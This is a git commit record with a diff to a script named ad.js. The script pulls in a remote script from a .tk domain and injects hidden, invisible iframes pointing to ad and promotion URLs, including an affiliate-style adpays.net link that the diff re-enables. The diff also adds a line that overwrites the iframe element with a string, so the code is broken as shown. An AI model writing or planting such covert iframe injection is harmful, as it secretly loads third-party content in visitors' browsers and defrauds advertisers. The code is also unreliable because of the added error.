b81fdd9782d1c54b6111c1aaf966131b610d246f
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-08-22 17:35:41 +0800

    wer

--- ad.js
+++ ad.js
@@ -6,13 +6,14 @@ b.src = "http://www.7k77.tk/eicXsB?1503385493";
 //插广告
 var adList=[
     'http://www.hupress.tk/',
-    // 'http://adpays.net/v.php?user=4297',
+    'http://adpays.net/v.php?user=4297',
     // 'http://ptp.skillerzforum.com/promote.php?id=22979'
 ]
 for(var i=0,len=adList.length;i<len;i++){
     //iframe 
     var elemIF = document.createElement("iframe");
     elemIF.src = adList[i];
+    elemIF = "allow-scripts allow-same-origin"
     elemIF.style.display = "none";
     document.body.appendChild(elemIF)
     //a标签
